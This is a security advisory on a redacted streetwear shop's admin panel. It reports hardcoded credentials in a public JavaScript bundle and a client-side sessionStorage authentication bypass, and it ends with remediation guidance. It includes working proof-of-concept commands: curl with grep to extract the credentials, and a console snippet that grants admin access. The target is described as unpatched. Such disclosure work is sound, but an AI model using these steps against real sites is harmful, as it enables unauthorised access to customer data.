# VLN-001 — Hardcoded Credentials & Client-Side Authentication Bypass

> **Target:** ▓▓▓▓▓ Streetwear — Admin Panel  
> **URL:** `https://www.▓▓▓▓▓-streetwear.com/admin`  
> **Audit Type:** Black-box / Source Review  
> **Severity:** 🔴 Critical  
> **Status:** Disclosed to client — Patch Ignored  
> **Date:** 2025-31-03 | 3:29:31 PM  
> **By:** Aymen Chouiter  

---

## Table of Contents

1. [Summary](#summary)
2. [Vulnerability Details](#vulnerability-details)
3. [Technical Analysis](#technical-analysis)
4. [Proof of Concept](#proof-of-concept)
5. [Impact](#impact)
6. [CVSS Score](#cvss-score)
7. [Root Cause](#root-cause)
8. [Remediation](#remediation)

---

## Summary

The admin panel of ▓▓▓▓▓ **Streetwear** (`/admin`) contains two critical authentication vulnerabilities:

1. **Hardcoded credentials** exposed in a publicly accessible JavaScript bundle.
2. **Client-side-only authentication** that can be bypassed entirely without any credentials.

Any unauthenticated attacker who visits the site can gain full admin access — including orders, customer data, product management, and site settings.

---

## Vulnerability Details

| Field | Value |
|-------|-------|
| **CWE** | CWE-798 (Hardcoded Credentials), CWE-602 (Client-Side Auth) |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Affected Component** | `Admin-CawTEvGu.js` (publicly served JS bundle) |
| **Authentication Type** | Client-side only (sessionStorage) |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Attack Vector** | Network (Remote) |

---

## Technical Analysis

### 1. Hardcoded Credentials in Public JS Bundle

The file `https://www.▓▓▓▓▓-streetwear.com/assets/Admin-CawTEvGu.js` is served publicly with no access control. Inside it, the login validation function contains plaintext credentials:

```javascript
// Extracted from Admin-CawTEvGu.js
const w = async c => {
    c.preventDefault();
    i === "▓▓▓▓▓@gmail.com" && m === "▓▓▓▓▓23"
        ? (sessionStorage.setItem("admin_auth", "true"), r(!0), x("/admin/dashboard"))
        : (f("Invalid credentials"), h(!1));
};
```

- **Email:** `▓▓▓▓▓@gmail.com`  
- **Password:** `▓▓▓▓▓23`

These are readable by anyone using browser DevTools → Sources tab, or by simply fetching the URL directly.

---

### 2. Client-Side Authentication Bypass (sessionStorage)

Upon successful "login", the app sets a single sessionStorage flag:

```javascript
sessionStorage.setItem("admin_auth", "true");
```

The protected dashboard component only checks for this flag:

```javascript
// Auth check in component
sessionStorage.getItem("admin_auth") === "true"
    && (r(!0), u.pathname === "/admin" && x("/admin/dashboard"));
```

There is **no server-side session**, **no JWT**, **no cookie validation**. The entire auth state lives in the browser.

---

### 3. No Server-Side Protection on Admin Routes

Admin routes such as `/admin/orders`, `/admin/customers`, `/admin/products` are served from the same static bundle with no server-side middleware enforcing access control. The backend API endpoints used by these pages may also lack authentication headers checks.

---

## Proof of Concept

### PoC 1 — Credential Extraction (30 seconds)

```bash
curl https://www.▓▓▓▓▓-streetwear.com/assets/Admin-CawTEvGu.js | grep -o '"[^"]*@[^"]*"'
# Output: "▓▓▓▓▓@gmail.com"

curl https://www.▓▓▓▓▓-streetwear.com/assets/Admin-CawTEvGu.js | grep -o '"▓▓▓▓▓[^"]*"'
# Output: "▓▓▓▓▓23"
```

### PoC 2 — Authentication Bypass via Browser Console

No credentials needed. Open DevTools on any page of the site and run:

```javascript
sessionStorage.setItem("admin_auth", "true");
window.location.href = "/admin/dashboard";
// Full admin access granted.
```

**Expected result:** Full access to the admin dashboard without entering any credentials.

## Proof of Concept — Video Demonstration

<a href="https://www.loom.com/share/f475fc38cca3465ca369309f0130b641" target="_blank">
  <img src="https://img.shields.io/badge/▶_Watch_PoC-Demo-red?style=for-the-badge" alt="Watch PoC"/>
</a>

---

## Impact

| Risk | Description |
|------|-------------|
| **Data Breach** | Full access to customer PII (names, addresses, phone numbers) |
| **Order Manipulation** | Ability to view, modify, or delete all orders |
| **Content Tampering** | Site settings, products, hero images, menus — all editable |
| **Business Disruption** | Attacker can manipulate drops, offers, delivery settings |
| **Reputation** | Customer trust damage if breach is publicized |

---

## CVSS Score

**Score: 10.0 (Critical)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

---

## Root Cause

The root cause is an architectural decision to implement authentication entirely on the client side within a React SPA, without any server-side session or token validation. This is a common mistake when transitioning from prototyping to production without a security review.

```
❌ Wrong approach (current):
Browser → check sessionStorage → grant access

✅ Correct approach:
Browser → POST /api/login → Server validates → issues JWT/session cookie
Every protected API request → Server validates token → responds
```

---

## Remediation

### Immediate Actions (P0)

- [ ] **Change credentials immediately** — `▓▓▓▓▓23` is now public knowledge
- [ ] **Remove all hardcoded credentials** from any JS file
- [ ] **Block direct access** to admin JS bundles via server config (Nginx/Caddy)

### Short-Term (P1)

- [ ] Move authentication to the **server side** using JWT or HTTP-only session cookies
- [ ] Every admin API request must validate the token server-side
- [ ] Implement **rate limiting** on the login endpoint (e.g., 5 attempts / 15 min)

### Long-Term (P2)

- [ ] Deploy the admin panel on a **separate subdomain** (`admin.▓▓▓▓▓-streetwear.com`) with server-side routing protection
- [ ] Add **Multi-Factor Authentication (MFA)** for admin access
- [ ] Set up **IP allowlisting** if admin access is only needed from known locations
- [ ] Regular security audits before deploying new features

### Secure Login Example (Node.js / Express)

```javascript
// Server-side login endpoint
app.post("/api/admin/login", async (req, res) => {
    const { email, password } = req.body;
    const admin = await db.findAdminByEmail(email);

    if (!admin || !bcrypt.compareSync(password, admin.passwordHash)) {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign({ id: admin.id, role: "admin" }, process.env.JWT_SECRET, {
        expiresIn: "8h"
    });

    res.cookie("admin_token", token, { httpOnly: true, secure: true, sameSite: "strict" });
    res.json({ success: true });
});

// Middleware to protect admin routes
function requireAdmin(req, res, next) {
    const token = req.cookies.admin_token;
    if (!token) return res.status(401).json({ error: "Unauthorized" });

    try {
        req.admin = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
        res.status(401).json({ error: "Invalid token" });
    }
}
```

---

*All findings were responsibly disclosed to the client before publication.*
